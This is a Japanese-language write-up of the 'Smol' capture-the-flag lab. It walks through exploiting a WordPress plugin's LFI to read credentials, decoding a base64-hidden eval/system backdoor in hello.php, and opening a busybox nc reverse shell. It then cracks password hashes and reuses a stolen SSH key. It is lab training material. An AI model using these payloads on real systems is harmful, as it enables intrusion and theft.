
- URL : https://tryhackme.com/room/smol
 #medium 
- OS : #Linux 
- Hack Date: 2025-07-10

# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ
## nmap

| **ポート** | **サービス** | **バージョン**                                                    | **その他**                                    |
| ------- | -------- | ------------------------------------------------------------ | ------------------------------------------ |
| 22/tcp  | ssh      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) |                                            |
| 80/tcp  | http     | Apache httpd 2.4.41 ((Ubuntu))                               | http-server-header: Apache/2.4.41 (Ubuntu) |

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMc4hLykriw3nBOsKHJK1Y6eauB8OllfLLlztbB4tu4c9cO8qyOXSfZaCcb92uq/Y3u02PPHWq2yXOLPler1AFGVhuSfIpokEnT2jgQzKL63uJMZtoFzL3RW8DAzunrHhi/nQqo8sw7wDCiIN9s4PDrAXmP6YXQ5ekK30om9kd5jHG6xJ+/gIThU4ODr/pHAqr28bSpuHQdgphSjmeShDMg8wu8Kk/B0bL2oEvVxaNNWYWc1qHzdgjV5HPtq6z3MEsLYzSiwxcjDJ+EnL564tJqej6R69mjII1uHStkrmewzpiYTBRdgi9A3Yb+x8NxervECFhUR2MoR1zD+0UJbRA2v1LQaGg9oYnYXNq3Lc5c4aXz638wAUtLtw2SwTvPxDrlCmDVtUhQFDhyFOu9bSmPY0oGH5To8niazWcTsCZlx2tpQLhF/gS3jP/fVw+H6Eyz/yge3RYeyTv3ehV6vXHAGuQLvkqhT6QS21PLzvM7bCqmo1YIqHfT2DLi7jZxdk=
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJNL/iO8JI5DrcvPDFlmqtX/lzemir7W+WegC7hpoYpkPES6q+0/p4B2CgDD0Xr1AgUmLkUhe2+mIJ9odtlWW30=
|   256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFG/Wi4PUTjReEdk2K4aFMi8WzesipJ0bp0iI0FM8AfE
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://www.smol.thm
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=7/9%OT=22%CT=%CU=34181%PV=Y%DS=4%DC=T%G=N%TM=686E7170%
OS:P=aarch64-unknown-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A
OS:)OPS(O1=M509ST11NW7%O2=M509ST11NW7%O3=M509NNT11NW7%O4=M509ST11NW7%O5=M50
OS:9ST11NW7%O6=M509ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3
OS:)ECN(R=Y%DF=Y%T=40%W=F507%O=M509NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
OS:0%CD=S)

Uptime guess: 46.853 days (since Fri May 23 10:12:42 2025)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   117.82 ms 10.13.0.1
2   ... 3
4   248.35 ms 10.10.128.4

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:41
Completed NSE at 06:41, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:41
Completed NSE at 06:41, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:41
Completed NSE at 06:41, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.87 seconds
           Raw packets sent: 39 (2.526KB) | Rcvd: 26 (1.814KB)

```
- `http://www.smol.thm`というドメインがわかったので、`/etc/hosts`に追加


こんな感じのWebサイト
- CTFのサイトっぽい

<img src="https://i.imgur.com/vClFbpR.png" width="600">


- wordpressを使ってるとのこと
	- Get In Touchボタンは特に反応しない
![](https://i.imgur.com/SOv9T59.png)

## whatweb
Wordpressのバージョンは、6.7.1とのこと
```bash
└─$ whatweb http://www.smol.thm
http://www.smol.thm [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[admin@smol.thm], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.128.4], JQuery[3.7.1], MetaGenerator[WordPress 6.7.1], Script[importmap,module], Title[AnotherCTF], UncommonHeaders[link], WordPress[6.7.1]    
```

## WPScan
- Wordpressを使ってるとのこと
- 再インストールはできない様子
- Wordpressのバージョンは6.7.1
- theme  : twentytwentythree 1.2
- jsmol2wp 1.07
	- Unauthenticated Cross-Site Scripting (XSS)
	- Unauthenticated Server Side Request Forgery (SSRF)
Users
- Jose Mario Llado Marti
- wordpress user
- admin
- think
- wp
- xavi
- gege
- diego
```sh
[+] URL: http://www.smol.thm/ [10.10.128.4]
[+] Started: Wed Jul  9 06:51:07 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://www.smol.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://www.smol.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://www.smol.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://www.smol.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Outdated, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://www.smol.thm/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |  - http://www.smol.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>

[+] WordPress theme in use: twentytwentythree
 | Location: http://www.smol.thm/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | [!] Directory listing is enabled
 | Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'

[+] Enumerating Vulnerable Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Cross-Site Scripting (XSS)
 |     References:
 |      - https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20462
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)
 |     References:
 |      - https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20463
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:17 <===============================================================================================> (652 / 652) 100.00% Time: 00:00:17
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:01:06 <=============================================================================================> (2575 / 2575) 100.00% Time: 00:01:06

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:04 <================================================================================================> (137 / 137) 100.00% Time: 00:00:04

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:02 <======================================================================================================> (84 / 84) 100.00% Time: 00:00:02

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:03 <===========================================================================================> (100 / 100) 100.00% Time: 00:00:03

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:04 <=================================================================================================> (10 / 10) 100.00% Time: 00:00:04

[i] User(s) Identified:

[+] Jose Mario Llado Marti
 | Found By: Rss Generator (Passive Detection)

[+] wordpress user
 | Found By: Rss Generator (Passive Detection)

[+] admin
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] think
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wp
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] xavi
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] gege
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] diego
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 22

[+] Finished: Wed Jul  9 06:53:03 2025
[+] Requests Done: 3620
[+] Cached Requests: 9
[+] Data Sent: 998.251 KB
[+] Data Received: 1.043 MB
[+] Memory used: 271.426 MB
[+] Elapsed time: 00:01:56
                            
```

## LFI
### [CVE-2018-20463](https://cve.org/CVERecord?id=CVE-2018-20463)
 JSmol2WPプラグイン 1.07に起因するCVE
- WPScanでは出てこなかったけど、ディレクトラバーサルによる任意のファイルの読み取りができてしまう脆弱性がある
	- https://nvd.nist.gov/vuln/detail/CVE-2018-20463

以下の.yamlの`requests:`のpathを参考に、URLを組み立てて、アクセスする
- https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/cves/2018/CVE-2018-20463.yaml

すると、wp-config.phpを取得することができる
```bash
http://www.smol.thm//wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

そして、Databaseの認証情報を取得できた
```sh
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
```


`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../../../../../..//etc/php/7.4/apache2/php.ini`
allow_url_includeは、offなので、RCEはできない
```php
;;;;;;;;;;;;;;;;;;
; Fopen wrappers ;
;;;;;;;;;;;;;;;;;;

; Whether to allow the treatment of URLs (like http:// or ftp://) as files.
; http://php.net/allow-url-fopen
allow_url_fopen = On

; Whether to allow include/require to open URLs (like http:// or ftp://) as files.
; http://php.net/allow-url-include
allow_url_include = Off
```



Databaseの認証情報を使い回していないか確認する
- 認証情報を使い回しているようで、ログインできた
![](https://i.imgur.com/1jAmBfx.png)

# Foothold

## RCE

探索していると、Pagesの中に「Webmaster Tasks!!」というPrivateの記事を見つけた
![](https://i.imgur.com/BOZpCIt.png)


開いてみると以下のような記事が出てきた
![](https://i.imgur.com/c1baUhc.png)

 内容としてはこんな感じ
 - どうやら、バックドアがあるらしい
 - しかし、Hello Dollyというのは、WPScanでは見つからなかった
```txt
1. **［重要］バックドアの確認**：サイトのコード改修として、「Hello Dolly」プラグインの**ソースコードを確認**してください。
    
2. **HTTPS の設定**：SSL証明書を構成して HTTPS を有効にし、データ通信を暗号化します。
    
3. **ソフトウェアの更新**：CMS・プラグイン・テーマを定期的に更新し、脆弱性を修正します。
    
4. **強力なパスワードの使用**：ユーザーおよび管理者に**強力なパスワード**を強制します。
    
5. **入力の検証**：SQLインジェクションやXSSなどの攻撃を防ぐため、**ユーザー入力を検証・サニタイズ**します。
    
6. **［重要］ファイアウォールの導入**：Webアプリケーションファイアウォール（WAF）を導入し、受信トラフィックをフィルタリングします。
    
7. **バックアップ戦略**：ウェブサイトおよびデータベースの**定期的なバックアップ**を設定します。
    
8. **［重要］ユーザー権限の管理**：ユーザーには**最小限必要な権限**のみをロールに応じて割り当てます。
    
9. **コンテンツセキュリティポリシー（CSP）の実装**：リソースの読み込みを制御し、悪意のあるスクリプトを防ぐために CSP を実装します。
    
10. **安全なファイルアップロード**：ファイル種別の検証、安全なアップロードディレクトリの使用、実行権限の制限などを行います。
    
11. **定期的なセキュリティ監査**：セキュリティ評価・脆弱性スキャン・ペネトレーションテストを**定期的に実施**します。
```

JSmol2のLFIの脆弱性で見てみる
`http://www.smol.thm//wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../..//wp-content/plugins/hello.php`

以下のコードを取得できる
元のhello.phpは、WordPress のデフォルトプラグイン「Hello Dolly」のソースコードで、普通は単なるお遊び的な機能
```php
<?php
/**
 * @package Hello_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/

function hello_dolly_get_lyric() {
	/** These are the lyrics to Hello Dolly */
	$lyrics = "Hello, Dolly
Well, hello, Dolly
<SNIP>;

	// Here we split it into lines.
	$lyrics = explode( "\n", $lyrics );

	// And then randomly choose a line.
	return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
}

// This just echoes the chosen line, we'll position it later.
function hello_dolly() {
	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
	
	$chosen = hello_dolly_get_lyric();
	$lang   = '';
	if ( 'en_' !== substr( get_user_locale(), 0, 3 ) ) {
		$lang = ' lang="en"';
	}

	printf(
		'<p id="dolly"><span class="screen-reader-text">%s </span><span dir="ltr"%s>%s</span></p>',
		__( 'Quote from Hello Dolly song, by Jerry Herman:' ),
		$lang,
		$chosen
	);
}

// Now we set that function up to execute when the admin_notices action is called.
add_action( 'admin_notices', 'hello_dolly' );

// We need some CSS to position the paragraph.
function dolly_css() {
	echo "
	<style type='text/css'>
	#dolly {
		float: right;
		padding: 5px 10px;
		margin: 0;
		font-size: 12px;
		line-height: 1.6666;
	}
	.rtl #dolly {
		float: left;
	}
	.block-editor-page #dolly {
		display: none;
	}
	@media screen and (max-width: 782px) {
		#dolly,
		.rtl #dolly {
			float: none;
			padding-left: 0;
			padding-right: 0;
		}
	}
	</style>
	";
}

add_action( 'admin_head', 'dolly_css' );


```

しかし、ここの部分が明らかに異常
元のプラグインにはなさそう
```php
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
```
base64をデコードして、
```
 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } 
```
UnEscapeすると、以下のコードだとわかる
```php
 if (isset($_GET["cmd"])) { system($_GET["cmd"]); } 
```

確かに、バックドアが仕掛けられている
このコードから、cmdパラメータに引数をつければ、任意のコマンドが実行できることがわかる
実際に試してみる

管理画面にログインした状態bのブラウザから試す
- idコマンドの実行結果が、表示されている
![](https://i.imgur.com/Lq0xfOs.png)

というか、この左上端に出てたのは、Hello Doly プラグインの歌詞だったのか
![](https://i.imgur.com/a4Fjloe.png)



しかし、このままだとやりづらいので、リバースシェルを確立する
`/bin/bash`では繋がらないので、どうしたものかと思い、`which bash`を実行したところ、`/usr/bin/bash`だったので、これで確立する
![](https://i.imgur.com/MZZPUI1.png)

以下のコマンドをURLエンコードして、80番で待ち受けると、リバースシェルが確立される
- busybox以外、繋がらないのでは？
```sh
busybox nc 10.13.88.79 80 -e /usr/bin/bash
```

```burp
GET /wp-admin/index.php?cmd=busybox%20nc%2010%2E13%2E88%2E79%2080%20%2De%20%2Fusr%2Fbin%2Fbash HTTP/1.1
Host: www.smol.thm
<SNIP>
```

確立したリバースシェル
```sh
└─$ sudo nc -lvnp 80
listening on [any] 80 ...
connect to [10.13.88.79] from (UNKNOWN) [10.10.128.4] 58036
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@smol:/var/www/wordpress/wp-admin$ id 
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@smol:/var/www/wordpress/wp-admin$ 

```

# Lateral Movement
さっき見つけた、データベースの認証情報で、ユーザーのパスワードハッシュを取得し、ハッシュクラックして、パスワードを取得する

ログイン
```bash
mysql -u wpuser -p -D wordpress
Enter password: kbLSF2Vop#lw3rjDZ629*Z%G
```

テーブル表示
```bash
mysql> show databases;
mysql> use wordpress
mysql> show tables;
```

wp_usersテーブルをすべて取得
```bash
mysql> select * from wp_users;
select * from wp_users;
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
|  1 | admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. | admin         | admin@smol.thm     | http://www.smol.thm | 2023-08-16 06:58:30 |                     |           0 | admin                  |
|  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
|  3 | think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
|  4 | gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
|  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@local        | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
|  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
6 rows in set (0.00 sec)
```

見にくいのでまとめる &　必要なところだけ取得
WordPress の phpass 形式で暗号化されている。しかし、phpass（Portable PHP password hashing） に基づいているので、
以下のコマンドでクラックできる
```sh
john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
クラックできたものは、書く

| ID  | user_login | user_pass                            | Decrypt Password   |
| --- | ---------- | ------------------------------------ | ------------------ |
| 1   | admin      | `$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.` |                    |
| 2   | wpuser     | `$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.` |                    |
| 3   | think      | `$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/` |                    |
| 4   | gege       | `$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1` |                    |
| 5   | diego      | `$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1` | sandiegocalifornia |
| 6   | xavi       | `$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1` |                    |

diegoになれた
```bash
www-data@smol:/home$ su diego
su diego
Password: sandiegocalifornia

diego@smol:/home$ 

```

user.txtを取得できた
```bash
diego@smol:~$ cat user.txt
```

```sh
diego@smol:/home/xavi$ id
id
uid=1002(diego) gid=1002(diego) groups=1002(diego),1005(internal)

```




# Privilege Escalation

```bash
diego@smol:~$ sudo -l
sudo -l
[sudo] password for diego: sandiegocalifornia

Sorry, user diego may not run sudo on smol.

```

/home/thinkに.sshフォルダがある
```bash
diego@smol:/home/think/.ssh$ ls
ls
authorized_keys  id_rsa  id_rsa.pub

```

この秘密鍵を使って、sshにログインする
```bash
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

thinkとしてログインできた
```bash
└─$ ssh think@10.10.128.4 -i think_id_rsa
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

